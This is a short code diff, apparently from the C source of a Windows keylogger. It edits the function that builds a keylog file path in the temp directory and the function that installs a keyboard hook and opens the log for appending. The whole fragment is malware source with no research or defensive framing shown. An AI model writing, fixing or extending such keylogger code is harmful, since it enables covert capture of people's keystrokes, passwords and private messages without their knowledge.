@@ -53,7 +53,6 @@ wchar_t * GetTempPathToKeylog()
 
     if (!temp_path) return NULL;
 
-    wcscat(temp_path, L"\\");
     wcscat(temp_path, KEYLOG_FILE);
 
     return temp_path;
@@ -149,7 +148,8 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 void SetKeyboardHook() {
 
-    wchar_t * path = GetTempPathToKeylog();
+    wchar_t * path = NULL;
+    path = GetTempPathToKeylog();
 
     logFile = OpenFileWithAppendWin32(path);
 
